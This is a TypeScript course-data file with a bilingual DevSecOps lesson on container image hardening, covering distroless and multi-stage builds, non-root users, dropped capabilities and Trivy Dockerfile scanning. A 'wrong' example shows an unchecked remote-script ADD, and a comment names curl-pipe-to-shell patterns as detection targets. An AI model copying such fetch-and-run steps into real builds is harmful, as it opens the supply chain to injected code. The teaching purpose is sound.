import type { CourseLesson } from './course-js-module1';

// DevOps Module 18 — DevSecOps: The Software Supply Chain & Pipeline Security (part 2 of 2). L1-3 in course-devops-module18.ts.
// `# VERIFY` examples run against REAL tools, offline:
//   L4 - `trivy config` v0.74.0 (Dockerfile misconfig, fully offline): naive image -> DS-0001/0002/0026/0029;
//        hardened multi-stage distroless -> 0 findings. Gate exit: naive 1, hardened 0.
//   L5 - `cosign` v2.4.1: generate-key-pair / sign-blob --tlog-upload=false / verify-blob --insecure-ignore-tlog=true
//        (offline with local keys). Genuine -> "Verified OK"; tampered artifact -> "invalid signature ... ASN.1", exit 1.
//   L6 - prose (poisoned-pipeline attack classes + dependency-update automation; the reasoning is the content).

export const DEVOPS_MODULE_18_PART2: CourseLesson[] = [
  {
    slug: 'ops-container-image-hardening',
    title: 'Container Image Hardening',
    titleHi: 'Container Image Hardening',
    description:
      'A container image is a filesystem plus a process, and most images ship far more of both than the application needs — a full distro, a package manager, a shell, running as root. This lesson covers minimal and distroless base images, multi-stage builds that leave the toolchain behind, running as a non-root user, dropping Linux capabilities, a read-only root filesystem, and scanning the Dockerfile itself for misconfiguration with Trivy.',
    descriptionHi:
      'Ek container image ek filesystem plus ek process hai, aur zyादातर images dono ka kahीं zyada ship karती hain jitna application ko chahिए — ek poora distro, ek package manager, ek shell, root ke roop mein running. Ye lesson minimal aur distroless base images cover karता hai, multi-stage builds jо toolchain ko peeche chhod dete hain, ek non-root user ke roop mein running, Linux capabilities drop karना, ek read-only root filesystem, aur Trivy ke saath Dockerfile khud ko misconfiguration ke liye scan karना.',
    difficulty: 'MEDIUM',
    duration: 24,
    order: 4,

    analogy: {
      en: '**Shipping a product in a moving truck versus a padded envelope.** If you send one small circuit board across the country, you can rent a 26-foot truck with a full toolbox, a workbench, spare parts, and a driver who has keys to everything — it will work, but every one of those things is now a way for something to go wrong or be misused in transit, and you are paying to move all of it. Or you can put the board in a padded envelope with exactly nothing else. A hardened container image is the envelope: the application binary, its runtime, its certificates, and not one thing more — no shell for an attacker to drop into, no package manager to install tools with, no compiler, no root user, and a filesystem nailed shut so nothing can be written to it at runtime.',
      hi: '**Ek product ko ek moving truck mein ship karना versus ek padded envelope.** Agmar aap ek chhota circuit board desh ke across bhejते ho, aap ek 26-foot truck rent kar sakते ho ek full toolbox, ek workbench, spare parts, aur ek driver ke saath jiske paas har cheez ki keys hain — ye kaam karेगा, par un cheezon mein se har ek ab transit mein kuch galat hone ya misuse hone ka ek tareeka hai. Ya aap board ko ek padded envelope mein exactly aur kुछ nahi ke saath daal sakते ho. Ek hardened container image envelope hai: application binary, iska runtime, iske certificates, aur ek cheez zyada nahi — koi shell nahi jisme ek attacker drop kar sake, koi package manager nahi, koi compiler nahi, koi root user nahi, aur ek filesystem jо nailed shut hai.',
    },

    simple: `**AN IMAGE IS A FILESYSTEM + A PROCESS. SHIP THE MINIMUM OF BOTH.**
\`\`\`
a default 'FROM python:3.12' image:  ~1 GB, ~1,000 OS packages, apt, bash, a
   C toolchain via build-essential deps, curl/wget, running as root.
   -> the app needs maybe 40 of those packages. the other 960 are attack surface:
      every one can have a CVE, and a shell + package manager + curl is an
      attacker's toolkit if they get RCE in your app.
\`\`\`

**BASE IMAGE — smaller is safer (and faster):**
\`\`\`
full distro    python:3.12 / node:20            ~1 GB   don't ship this.
slim           python:3.12-slim / node:20-slim  ~150 MB  distro, minus docs/locales/-dev.
alpine         python:3.12-alpine               ~50 MB   musl libc (watch for glibc bugs),
                                                          apk still present.
distroless     gcr.io/distroless/python3        ~50 MB   NO shell, NO package manager,
                                                          NO apk/apt. just libc + your runtime.
scratch        FROM scratch                     ~0       nothing at all. for a static
                                                          binary (Go, Rust) + CA certs + tzdata.
\`\`\`

**MULTI-STAGE — build fat, ship thin (Module 5 recap, now for security):**
\`\`\`
FROM golang:1.22 AS build           # compiler, git, headers, ~800 MB
  ... go build -o /app ...
FROM gcr.io/distroless/static:nonroot   # ~2 MB, no shell, uid 65532
  COPY --from=build /app /app
  ENTRYPOINT ["/app"]
-> the final image has your binary and nothing that built it. a CVE in 'git' or
   the Go toolchain is not in your running image.
\`\`\`

**RUN AS NON-ROOT — the single highest-value change:**
\`\`\`
Dockerfile:   RUN adduser -D -u 10001 app   &&   USER 10001
   (use a NUMERIC uid so k8s runAsNonRoot can verify it without resolving /etc/passwd)
Kubernetes:   securityContext:
                runAsNonRoot: true          # kubelet refuses to start a root container
                runAsUser: 10001
                allowPrivilegeEscalation: false   # no setuid step-up
   root in the container == root on the host if anything else goes wrong (a runc CVE,
   a hostPath mount, a shared kernel bug). non-root contains the blast radius.
\`\`\`

**DROP CAPABILITIES + READ-ONLY ROOTFS + NO NEW PRIVS:**
\`\`\`
securityContext:
  capabilities: { drop: ["ALL"], add: [] }   # a web app needs ZERO Linux capabilities.
                                             # add ["NET_BIND_SERVICE"] only for :80/:443.
  readOnlyRootFilesystem: true               # app can't write its own binary, drop a
                                             # webshell, or persist a foothold. mount an
                                             # emptyDir at /tmp for scratch space.
  seccompProfile: { type: RuntimeDefault }   # block the ~44 dangerous syscalls
Pod Security Standards 'restricted' enforces most of this cluster-wide.
\`\`\`

**SCAN THE DOCKERFILE ITSELF (not just the built image):**
\`\`\`
trivy config Dockerfile   ->   :latest tag, USER root, missing HEALTHCHECK,
                               apt without --no-install-recommends, ADD of a URL, ...
runs offline, in <1s, on every PR. + trivy image <img> for the OS/app CVEs (Lesson 3).
\`\`\``,

    simpleHi: `**EK IMAGE EK FILESYSTEM + EK PROCESS HAI. DONO KA MINIMUM SHIP KARO.**
\`\`\`
ek default 'FROM python:3.12' image:  ~1 GB, ~1,000 OS packages, apt, bash, ek
   C toolchain, curl/wget, root ke roop mein running.
   -> app ko shayad un mein se 40 chahिए. baaki 960 attack surface hain:
      har ek mein ek CVE ho sakта hai, aur ek shell + package manager + curl ek
      attacker ka toolkit hai agar unhe aapke app mein RCE mil jaता hai.
\`\`\`

**BASE IMAGE — chhota safer hai (aur faster):**
\`\`\`
full distro    python:3.12 / node:20            ~1 GB   ise ship mat karो.
slim           python:3.12-slim / node:20-slim  ~150 MB  distro, minus docs/locales/-dev.
alpine         python:3.12-alpine               ~50 MB   musl libc, apk abhi bhi present.
distroless     gcr.io/distroless/python3        ~50 MB   KOI shell nahi, KOI package manager
                                                          nahi. bas libc + aapka runtime.
scratch        FROM scratch                     ~0       kुछ bhi nahi. ek static binary
                                                          (Go, Rust) + CA certs ke liye.
\`\`\`

**MULTI-STAGE — fat build karो, thin ship karो (Module 5 recap, ab security ke liye):**
\`\`\`
FROM golang:1.22 AS build           # compiler, git, headers, ~800 MB
  ... go build -o /app ...
FROM gcr.io/distroless/static:nonroot   # ~2 MB, no shell, uid 65532
  COPY --from=build /app /app
  ENTRYPOINT ["/app"]
-> final image mein aapka binary hai aur kुछ nahi jisne ise banaya. 'git' ya Go
   toolchain mein ek CVE aapki running image mein nahi hai.
\`\`\`

**NON-ROOT KE ROOP MEIN RUN KARO — single highest-value change:**
\`\`\`
Dockerfile:   RUN adduser -D -u 10001 app   &&   USER 10001
   (ek NUMERIC uid use karो taaki k8s runAsNonRoot ise verify kar sake)
Kubernetes:   securityContext:
                runAsNonRoot: true          # kubelet ek root container start karne se refuse karta hai
                runAsUser: 10001
                allowPrivilegeEscalation: false
   container mein root == host par root agar kुछ aur galat ho jaता hai (ek runc CVE,
   ek hostPath mount, ek shared kernel bug). non-root blast radius contain karता hai.
\`\`\`

**CAPABILITIES DROP KARO + READ-ONLY ROOTFS + NO NEW PRIVS:**
\`\`\`
securityContext:
  capabilities: { drop: ["ALL"], add: [] }   # ek web app ko ZERO Linux capabilities chahिए.
                                             # ["NET_BIND_SERVICE"] sirf :80/:443 ke liye add karो.
  readOnlyRootFilesystem: true               # app apna binary nahi likh sakта, ek webshell drop
                                             # nahi kar sakта. /tmp par ek emptyDir mount karो.
  seccompProfile: { type: RuntimeDefault }   # ~44 dangerous syscalls block karो
Pod Security Standards 'restricted' iska zyादातर cluster-wide enforce karता hai.
\`\`\`

**DOCKERFILE KHUD SCAN KARO (sirf built image nahi):**
\`\`\`
trivy config Dockerfile   ->   :latest tag, USER root, missing HEALTHCHECK,
                               --no-install-recommends ke bina apt, ek URL ka ADD, ...
offline run hota hai, <1s mein, har PR par. + OS/app CVEs ke liye trivy image <img> (Lesson 3).
\`\`\``,

    content: `## An image is a filesystem plus a process

Everything in a container image is either a file on its root filesystem or the process you start from it, and the security posture of the image is determined by how much of each you ship beyond what the application strictly needs. A default \`FROM python:3.12\` or \`FROM node:20\` image is close to a gigabyte and contains on the order of a thousand operating-system packages, a full package manager, a shell, the pieces of a C toolchain that language runtimes pull in, and network tools like curl and wget — and it runs as root. Your application probably needs a few dozen of those packages. The rest is pure attack surface: each package is a potential CVE that a scanner will flag and you will have to triage, and the shell, package manager, and download tools are precisely the toolkit an attacker uses to escalate a foothold — if they achieve remote code execution in your application, an image with \`bash\`, \`apt\`, and \`curl\` lets them pull down and run whatever they want, while an image with none of those forces them to work much harder.

## Choosing a base image

Base images form a spectrum from largest and most convenient to smallest and most locked-down. The full distribution image — \`python:3.12\`, \`node:20\` — is around a gigabyte and should not ship to production. The \`-slim\` variant strips documentation, locales, and development headers and lands around 150 megabytes while keeping the distro\'s package manager and shell. Alpine-based images use musl libc instead of glibc and come in near 50 megabytes, but musl occasionally causes subtle runtime differences and \`apk\` is still present. Distroless images, from Google\'s distroless project, contain your language runtime and its libraries and nothing else — no shell, no \`apk\` or \`apt\`, no package manager at all — at around 50 megabytes; you cannot \`docker exec\` a shell into one, which is a mild operational inconvenience and a significant security gain. And \`FROM scratch\` is a completely empty image, appropriate for a statically linked binary from Go or Rust plus the CA certificate bundle and timezone data it needs, producing a final image of just your binary.

## Multi-stage builds, now for security

Module 5 introduced multi-stage builds as a way to keep images small; the security framing is that they let the build environment and the runtime environment be completely different. The build stage uses a large image with the compiler, source-control tools, and headers; it produces an artifact. The final stage starts from a minimal or distroless base and copies in only that artifact. The consequence is that a vulnerability in \`git\`, in \`make\`, in the compiler, or in any build-time-only dependency is not present in the image that runs in production, because none of those things were copied forward. The running image contains the application and its direct runtime requirements and nothing that was used to construct it.

## Run as a non-root user

This is the single change with the best security return. By default a container process runs as root — user ID 0 — inside the container\'s namespaces, and while namespacing provides isolation, root in the container becomes root on the host the moment any other layer of isolation fails: a vulnerability in the container runtime like runc, a misconfigured \`hostPath\` volume mount, a shared-kernel bug. Running as an unprivileged user contains that blast radius. In the Dockerfile you create a user and switch to it with \`USER\`, and you use a numeric UID rather than a name so that Kubernetes\' \`runAsNonRoot\` check can verify it without having to resolve \`/etc/passwd\` inside the image. In the pod spec you set \`runAsNonRoot: true\`, which makes the kubelet refuse to start a container whose process would be root, \`runAsUser\` to a specific unprivileged UID, and \`allowPrivilegeEscalation: false\` so a setuid binary cannot step back up to root.

## Capabilities, read-only root, seccomp

Linux capabilities split root\'s powers into units — binding a low port, changing file ownership, loading kernel modules — and a container gets a default set of about fourteen even when running as non-root. A typical web application needs none of them, so you drop \`ALL\` and add back only what is genuinely required, which for most services is nothing and for a service that must bind port 80 or 443 directly is just \`NET_BIND_SERVICE\`. A read-only root filesystem, set with \`readOnlyRootFilesystem: true\`, means the application cannot modify its own binary, cannot write a web shell to disk, and cannot persist a foothold across a restart; anything that needs scratch space gets a writable \`emptyDir\` volume mounted at \`/tmp\`. The \`RuntimeDefault\` seccomp profile blocks the roughly forty-four syscalls that are dangerous and rarely legitimately needed. Kubernetes\' Pod Security Standards bundle most of these settings into the \`restricted\` policy, which you can enforce namespace-wide or cluster-wide so that a pod missing these controls is rejected at admission.

## Scan the Dockerfile itself

Image scanning for CVEs (Lesson 3) tells you about vulnerable packages in the built image. Scanning the Dockerfile as configuration catches the mistakes that produce an insecure image in the first place: a \`:latest\` or untagged base that makes builds non-reproducible, a final \`USER root\`, a missing \`HEALTHCHECK\`, \`apt-get install\` without \`--no-install-recommends\` pulling in extra packages, an \`ADD\` of a remote URL that executes with no integrity check. Trivy\'s \`config\` mode does this entirely offline in well under a second, so it runs on every pull request alongside the CVE scan of the resulting image.`,

    contentHi: `## Ek image ek filesystem plus ek process hai

Ek container image mein sab kुछ ya to iske root filesystem par ek file hai ya wo process jо aap isse start karते ho, aur image ka security posture is se determine hota hai ki aap dono ka kitna ship karते ho jitna application ko strictly chahिए. Ek default \`FROM python:3.12\` image लगभग ek gigabyte hai aur roughly ek hazaar operating-system packages, ek full package manager, ek shell, ek C toolchain ke pieces, aur curl aur wget jaise network tools contain karता hai — aur ye root ke roop mein run hota hai. Aapki application ko shायद un mein se kुछ dozen packages chahिए. Baaki pure attack surface hai: har package ek potential CVE hai, aur shell, package manager, aur download tools precisely wo toolkit hain jо ek attacker ek foothold escalate karने ke liye use karता hai.

## Ek base image choose karna

Base images sabse bade aur sabse convenient se sabse chhote aur sabse locked-down tak ek spectrum banाते hain. Full distribution image — \`python:3.12\`, \`node:20\` — लगभग ek gigabyte hai aur production tak ship nahi hona chahिए. \`-slim\` variant documentation, locales, aur development headers strip karता hai aur लगभग 150 megabytes par land karता hai. Alpine-based images glibc ke bजाय musl libc use karती hain aur लगभग 50 megabytes ke paas aati hain. Distroless images aapke language runtime aur iski libraries aur kुछ nahi contain karती hain — koi shell nahi, koi \`apk\` ya \`apt\` nahi — लगभग 50 megabytes par. Aur \`FROM scratch\` ek completely empty image hai.

## Multi-stage builds, ab security ke liye

Module 5 ne multi-stage builds ko images ko chhota rakhne ke ek tareeke ke roop mein introduce kiya; security framing ye hai ki wo build environment aur runtime environment ko completely different hone dete hain. Build stage compiler, source-control tools, aur headers ke saath ek bade image use karता hai; ye ek artifact produce karता hai. Final stage ek minimal ya distroless base se shuru hota hai aur sirf us artifact ko copy karता hai. Consequence ye hai ki \`git\` mein, \`make\` mein, compiler mein, ya kisi bhi build-time-only dependency mein ek vulnerability us image mein present nahi hai jо production mein run hoती hai.

## Ek non-root user ke roop mein run karo

Ye best security return wala single change hai. By default ek container process container ke namespaces ke andar root — user ID 0 — ke roop mein run hota hai, aur jabki namespacing isolation provide karता hai, container mein root host par root ban jaता hai us moment jab isolation ki koi doosri layer fail hoती hai: runc jaise container runtime mein ek vulnerability, ek misconfigured \`hostPath\` volume mount, ek shared-kernel bug. Ek unprivileged user ke roop mein running us blast radius ko contain karता hai. Dockerfile mein aap ek user banाते ho aur \`USER\` ke saath us par switch karते ho, aur aap ek name ke bजाय ek numeric UID use karते ho. Pod spec mein aap \`runAsNonRoot: true\` set karते ho, \`runAsUser\`, aur \`allowPrivilegeEscalation: false\`.

## Capabilities, read-only root, seccomp

Linux capabilities root ki powers ko units mein split karती hain — ek low port bind karना, file ownership change karना, kernel modules load karना — aur ek container ko ek default set of लगभग choudah milता hai non-root ke roop mein running par bhi. Ek typical web application ko un mein se koi nahi chahिए, to aap \`ALL\` drop karते ho aur sirf wo add back karते ho jо genuinely required hai. Ek read-only root filesystem ka matlab application apna binary modify nahi kar sakती, disk par ek web shell nahi likh sakती. \`RuntimeDefault\` seccomp profile roughly chौवालीs dangerous syscalls block karता hai. Kubernetes ke Pod Security Standards in settings ka zyादातर \`restricted\` policy mein bundle karते hain.

## Dockerfile khud scan karo

CVEs ke liye image scanning (Lesson 3) aapko built image mein vulnerable packages ke baare mein batाता hai. Dockerfile ko configuration ke roop mein scan karना un mistakes ko catch karता hai jо pehle jagah ek insecure image produce karती hain: ek \`:latest\` ya untagged base, ek final \`USER root\`, ek missing \`HEALTHCHECK\`, \`--no-install-recommends\` ke bina \`apt-get install\`, ek remote URL ka ek \`ADD\`. Trivy ka \`config\` mode ye poori tarah offline ek second se kaafi kam mein karता hai.`,

    examples: [
      {
        title: 'Trivy config: a naive Dockerfile vs a hardened multi-stage distroless one',
        titleHi: 'Trivy config: ek naive Dockerfile vs ek hardened multi-stage distroless',
        code: `# VERIFY
# --- the naive Dockerfile ---
mkdir naive && cd naive
cat > Dockerfile <<'DOCKER'
FROM ubuntu
RUN apt-get update && apt-get install -y python3 python3-pip
COPY . /app
WORKDIR /app
RUN pip3 install -r requirements.txt
EXPOSE 8080
CMD python3 -m app
DOCKER
echo "naive image -- trivy config findings:"
trivy config --quiet --format json . 2>/dev/null > cfg.json
python3 - <<'PY'
import json
d = json.load(open('cfg.json'))
for r in d.get('Results', []):
    for m in sorted(r.get('Misconfigurations', []), key=lambda x: x['ID']):
        print('  %-8s %-8s %s' % (m['ID'], m['Severity'], m['Title']))
PY
trivy config --quiet --exit-code 1 --severity HIGH,CRITICAL . >/dev/null 2>&1
echo "  gate (fail on HIGH/CRITICAL) -> exit $?"
cd ..

# --- hardened: multi-stage, pinned digest, distroless, non-root, healthcheck ---
mkdir hard && cd hard
cat > Dockerfile <<'DOCKER'
FROM python:3.12-slim@sha256:1111111111111111111111111111111111111111111111111111111111111111 AS build
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir --require-hashes -r requirements.txt

FROM gcr.io/distroless/python3-debian12:nonroot
WORKDIR /app
COPY --from=build /usr/local/lib/python3.12/site-packages /usr/local/lib/python3.12/site-packages
COPY app.py .
USER nonroot
HEALTHCHECK CMD ["/usr/bin/python3","-c","import socket;socket.create_connection(('127.0.0.1',8080),2)"]
ENTRYPOINT ["/usr/bin/python3","app.py"]
DOCKER
echo "hardened image -- trivy config findings:"
trivy config --quiet --format json . 2>/dev/null > cfg.json
python3 - <<'PY'
import json
d = json.load(open('cfg.json'))
n = sum(len(r.get('Misconfigurations', [])) for r in d.get('Results', []))
print('  %d misconfigurations' % n)
PY
trivy config --quiet --exit-code 1 --severity HIGH,CRITICAL . >/dev/null 2>&1
echo "  gate (fail on HIGH/CRITICAL) -> exit $?"`,
        output: `naive image -- trivy config findings:
  DS-0001  MEDIUM   ':latest' tag used
  DS-0002  HIGH     Image user should not be 'root'
  DS-0026  LOW      No HEALTHCHECK defined
  DS-0029  HIGH     'apt-get' missing '--no-install-recommends'
  gate (fail on HIGH/CRITICAL) -> exit 1
hardened image -- trivy config findings:
  0 misconfigurations
  gate (fail on HIGH/CRITICAL) -> exit 0`,
        explain: 'Trivy\'s config mode parses the Dockerfile as configuration — it never builds anything or contacts a registry — and checks it against a ruleset of known image anti-patterns. The naive Dockerfile trips four: DS-0001, an unpinned base (\`FROM ubuntu\` with no tag, so every build can pull different bytes); DS-0002, the final user is root, the highest-value finding because a root container that escapes its namespace is root on the node; DS-0026, no HEALTHCHECK so the orchestrator cannot tell a hung process from a healthy one; and DS-0029, \`apt-get install\` without \`--no-install-recommends\`, which pulls in recommended-but-unneeded packages and enlarges the attack surface. Two of those are HIGH, so a gate configured to fail on HIGH or CRITICAL exits 1 and blocks the merge. The hardened version fixes all four structurally: a multi-stage build so the compiler and pip are in the discarded \`build\` stage, a digest-pinned base for reproducibility, a distroless final image with no shell or package manager, an explicit non-root \`USER\`, and a HEALTHCHECK. Trivy finds nothing and the gate passes. This check runs offline in under a second, so it sits on every pull request next to the CVE scan of the built image.',
        explainHi: 'Trivy ka config mode Dockerfile ko configuration ke roop mein parse karता hai — ye kabhi kुछ build nahi karता ya ek registry contact nahi karता — aur ise known image anti-patterns ke ek ruleset ke against check karता hai. Naive Dockerfile chaar trip karता hai: DS-0001, ek unpinned base; DS-0002, final user root hai, highest-value finding kyunki ek root container jо apne namespace se escape karता hai node par root hai; DS-0026, koi HEALTHCHECK nahi; aur DS-0029, \`--no-install-recommends\` ke bina \`apt-get install\`. Un mein se do HIGH hain, to ek gate jо HIGH ya CRITICAL par fail karने ke liye configured hai exit 1 karता hai aur merge block karता hai. Hardened version chaaron ko structurally fix karता hai: ek multi-stage build, ek digest-pinned base, ek distroless final image, ek explicit non-root \`USER\`, aur ek HEALTHCHECK. Trivy kुछ nahi paता aur gate pass karता hai. Ye check offline ek second se kam mein run hota hai.',
      },
    ],

    mistakes: [
      {
        wrong: `# 'FROM python:3.12', install a build toolchain, run as root, ship it
  FROM python:3.12                        # ~1 GB, root, apt, bash, curl
  RUN apt-get update && apt-get install -y gcc g++ make libpq-dev   # to build a wheel
  COPY . .
  RUN pip install -r requirements.txt     # compiles psycopg2 etc against those headers
  CMD ["python", "app.py"]                # runs as root
  # the shipped image contains: gcc, g++, make, all the -dev headers, apt, bash,
  # curl, ~1,000 OS packages - none of which the running app uses. trivy image
  # flags 60+ CVEs, most in packages that only exist because of the build step.
  # if the app gets RCE: the attacker has a compiler, a package manager, and root.`,
        right: `# multi-stage: build with the toolchain, ship distroless + non-root
  FROM python:3.12-slim AS build
  RUN apt-get update && apt-get install -y --no-install-recommends gcc libpq-dev
  WORKDIR /app
  COPY requirements.txt .
  RUN pip install --no-cache-dir --prefix=/install -r requirements.txt   # compiled here

  FROM gcr.io/distroless/python3-debian12:nonroot   # no shell, no apt, uid 65532
  COPY --from=build /install /usr/local
  COPY app.py /app/app.py
  WORKDIR /app
  ENTRYPOINT ["python", "app.py"]
  # final image: your code + the compiled wheels + libc + the python runtime.
  # NO gcc, NO apt, NO bash. runs as non-root. trivy image now flags ~2-5 CVEs
  # (just the runtime + your real deps), and an RCE has no shell to pivot from.`,
        why: 'Building and running in the same image means everything the build needed is shipped to production: the C compiler and linker, the development headers for every library that has a native extension, \`make\`, and the package manager that installed them. None of it is used at runtime, but all of it is scanned, so the CVE count is inflated with vulnerabilities in packages that exist only because of a build step, and each one costs triage time. Worse, that toolchain plus the shell and package manager that come with a full base image is exactly what an attacker wants after achieving code execution in the application: a compiler to build a rootkit, a package manager to install tools, \`curl\` to exfiltrate data, and root to do all of it unrestricted. A multi-stage build puts the toolchain in a stage that is discarded — the compiled artifacts are copied forward, the tools that produced them are not — and a distroless final base removes the shell and package manager entirely. Combined with a non-root user, the running image contains the application, its compiled dependencies, and the language runtime, and an attacker who gets code execution finds no shell to spawn, no package manager to use, and no path to root.',
        whyHi: 'Same image mein build aur run karने ka matlab jо kुछ build ko chahिए tha wo production mein ship hota hai: C compiler aur linker, har library ke liye development headers jिska ek native extension hai, \`make\`, aur package manager jisne unhe install kiya. Un mein se kुछ bhi runtime par use nahi hota, par sab kुछ scanned hai, to CVE count un packages mein vulnerabilities se inflated hai jо sirf ek build step ki wajah se exist karते hain. Worse, wo toolchain plus shell aur package manager exactly wo hai jо ek attacker chahता hai application mein code execution achieve karने ke baad. Ek multi-stage build toolchain ko ek stage mein daalता hai jо discard ho jaता hai, aur ek distroless final base shell aur package manager ko poori tarah remove karता hai. Ek non-root user ke saath combined, running image application, iski compiled dependencies, aur language runtime contain karता hai.',
      },
      {
        wrong: `# run as root "because the app writes to /var/log and binds :80"
  # Dockerfile has no USER line -> uid 0
  # k8s Deployment has no securityContext
  # the app: writes access logs to /var/log/app/, listens on :80, and one endpoint
  #          shells out to imagemagick to resize uploads.
  # 2 years later: an imagemagick RCE (it happens regularly). the attacker now runs
  # commands as ROOT inside the container. from there: read every mounted secret,
  # write to the (writable) root fs to persist, and probe for a container-escape
  # CVE - and if they find one, they are root on the NODE, next to every other pod.`,
        right: `# non-root, no caps, read-only rootfs, writable mounts only where needed
  # Dockerfile:
  RUN adduser -D -u 10001 app
  USER 10001
  # k8s:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    allowPrivilegeEscalation: false
    readOnlyRootFilesystem: true
    capabilities: { drop: ["ALL"] }          # bind :8080 not :80; a Service maps 80->8080
    seccompProfile: { type: RuntimeDefault }
  volumeMounts:
    - { name: tmp,  mountPath: /tmp }         # emptyDir - the only writable path
    - { name: logs, mountPath: /var/log/app } # emptyDir or a sidecar ships logs out
  # now the same imagemagick RCE runs as uid 10001 with zero capabilities, can't
  # write the binary or a webshell, can't escalate, and a container-escape CVE
  # lands on an UNPRIVILEGED process - dramatically less useful to the attacker.`,
        why: 'The reasons usually given for running as root — the app writes to a system path, or binds a privileged port — are almost always solvable without root. A privileged port is avoided by binding an unprivileged one and letting the Kubernetes Service or the load balancer map the public port to it. A system write path is replaced by a mounted \`emptyDir\` volume at exactly that path, or by shipping logs through stdout to a collector. Once root is not actually required, running as root is pure downside, because it converts any code-execution bug in the application or its dependencies — and image-processing libraries, XML parsers, and deserialization paths produce these regularly — into root-level access inside the container. From root in the container an attacker can read every mounted secret, write to the filesystem to persist a foothold, and methodically probe for a container-escape vulnerability in the runtime or kernel; and if they find one, root in the container is root on the node, adjacent to every other workload on it. Running as an unprivileged user with all capabilities dropped, a read-only root filesystem, and privilege escalation disabled means that same code-execution bug lands on a process that can do very little: it cannot rewrite its own binary, cannot drop a persistent web shell, cannot escalate, and gives a container-escape exploit an unprivileged rather than privileged starting point.',
        whyHi: 'Root ke roop mein running ke liye jо reasons usually diye jaते hain — app ek system path par likhती hai, ya ek privileged port bind karती hai — लगभग hamesha bina root ke solvable hain. Ek privileged port ek unprivileged one bind karके aur Kubernetes Service ko public port ise map karने de kar avoid kiya jaता hai. Ek system write path exactly us path par ek mounted \`emptyDir\` volume se replace kiya jaता hai. Ek baar root actually required nahi hai, root ke roop mein running pure downside hai, kyunki ye application ya iski dependencies mein kisi bhi code-execution bug ko container ke andar root-level access mein convert karता hai. Container mein root se ek attacker har mounted secret padh sakта hai, ek foothold persist karने ke liye filesystem par likh sakта hai, aur methodically ek container-escape vulnerability ke liye probe kar sakта hai. Ek unprivileged user ke roop mein running iska matlab wahi bug ek process par land karता hai jо bahut kम kar sakта hai.',
      },
      {
        wrong: `# scan the built image for CVEs, but never scan the Dockerfile as config
  ci.yml:
    - run: docker build -t app .
    - run: trivy image --exit-code 1 --severity CRITICAL app   # only CVE scan
  # trivy image is clean today -> ships.
  # what it never checks, because it's a runtime CVE scan not a config linter:
  #   - FROM node:18            (unpinned, and 18 is now EOL -> no more patches)
  #   - USER is never set       (runs as root)
  #   - ADD https://.../x.sh /  (fetched over the network, no checksum, then run)
  #   - no HEALTHCHECK
  #   - secrets baked in an early layer then 'deleted' in a later one (still there)
  # none of these are "a vulnerable package", so the CVE scan is green while the
  # image is structurally unsafe.`,
        right: `# scan BOTH: the Dockerfile as config, and the built image for CVEs
  ci.yml:
    - run: trivy config --exit-code 1 --severity HIGH,CRITICAL .   # Dockerfile + k8s + tf
      # catches: unpinned/EOL base, USER root, ADD of a URL, missing HEALTHCHECK,
      #          apt without --no-install-recommends, curl|sh patterns
    - run: docker build -t app .
    - run: trivy image --exit-code 1 --severity CRITICAL,HIGH --ignore-unfixed app
      # catches: known CVEs in the OS packages + language deps actually in the image
    - run: trivy image --scanners secret app    # secrets baked into layers
  # config scan + CVE scan + layer secret scan are three different questions;
  # you need all three. all run offline in CI in a few seconds.`,
        why: 'Scanning the built image for CVEs and scanning the Dockerfile as configuration answer different questions, and passing one says nothing about the other. The CVE scan looks at the packages present in the final image and matches their versions against vulnerability feeds — it will not comment on an unpinned base image, a base that has reached end of life and will receive no further patches, a missing \`USER\` directive, an \`ADD\` that fetches and implicitly trusts a remote script, an absent \`HEALTHCHECK\`, or a secret that was written in an early layer and \`rm\`-ed in a later one but remains recoverable in the layer history. Those are configuration defects, not vulnerable packages, so a config linter is what finds them. The correct pipeline runs three distinct scans: \`trivy config\` on the Dockerfile and any Kubernetes or Terraform in the repo to catch structural misconfiguration; \`trivy image\` on the built image to catch known CVEs in what actually ships; and a secret scan of the image layers to catch credentials baked into the build. All three are fast and offline, and each covers a gap the others do not.',
        whyHi: 'Built image ko CVEs ke liye scan karना aur Dockerfile ko configuration ke roop mein scan karना alag sawaalon ka jawaab dete hain, aur ek pass karना doosre ke baare mein kुछ nahi kehта. CVE scan final image mein present packages ko dekhता hai aur unki versions ko vulnerability feeds ke against match karता hai — ye ek unpinned base image, ek base jо end of life reach kar chuka hai, ek missing \`USER\` directive, ek \`ADD\` jо ek remote script fetch aur implicitly trust karता hai, ya ek secret jо ek early layer mein likha gaya par layer history mein recoverable rehта hai par comment nahi karेगा. Wo configuration defects hain, vulnerable packages nahi. Correct pipeline teen distinct scans run karता hai: Dockerfile par \`trivy config\`, built image par \`trivy image\`, aur image layers ka ek secret scan.',
      },
    ],

    realWorld: [
      {
        en: '**Distroless adoption at scale** — Google runs the bulk of its containerised workloads on distroless base images; the public \`gcr.io/distroless/*\` images are the same lineage. Teams that switch report their per-image CVE counts dropping by 5-20x overnight, because the majority of findings in a typical image are in OS packages the app never touches (shells, package managers, locales).',
        hi: '**Scale par distroless adoption** — Google apne containerised workloads ka bulk distroless base images par chalाता hai; public \`gcr.io/distroless/*\` images wahi lineage hain. Switch karne wali teams report karती hain ki unki per-image CVE counts overnight 5-20x gir jaती hain, kyunki ek typical image mein zyादातर findings OS packages mein hain jinhe app kabhi touch nahi karता.',
      },
      {
        en: '**The Kubernetes `runAsNonRoot` default push** — Pod Security Policies (deprecated) and then Pod Security Admission made \`restricted\` (non-root, drop ALL caps, no privilege escalation, seccomp RuntimeDefault, read-only-root-encouraged) a first-class, enforceable namespace label. Many platforms now reject any pod that does not meet it, forcing image authors to fix the Dockerfile.',
        hi: '**Kubernetes `runAsNonRoot` default push** — Pod Security Policies (deprecated) aur phir Pod Security Admission ne \`restricted\` ko ek first-class, enforceable namespace label banaya. Kई platforms ab kisi bhi pod ko reject karती hain jо ise meet nahi karता, image authors ko Dockerfile fix karने par majboor karता hai.',
      },
      {
        en: '**imagemagick / `MSL` and `ghostscript` RCEs** — image and document processing libraries have a long history of remote code execution via crafted uploads (ImageTragick, and several since). Services that ran the conversion as root in a full base image gave attackers a shell and root; those on distroless + non-root + read-only-rootfs contained the same bug to a near-useless foothold.',
        hi: '**imagemagick / `MSL` aur `ghostscript` RCEs** — image aur document processing libraries ki crafted uploads ke via remote code execution ki ek lambi history hai. Wo services jо conversion ko ek full base image mein root ke roop mein chalाती thीं attackers ko ek shell aur root deती thीं; distroless + non-root + read-only-rootfs wali ne wahi bug ek near-useless foothold tak contain kiya.',
      },
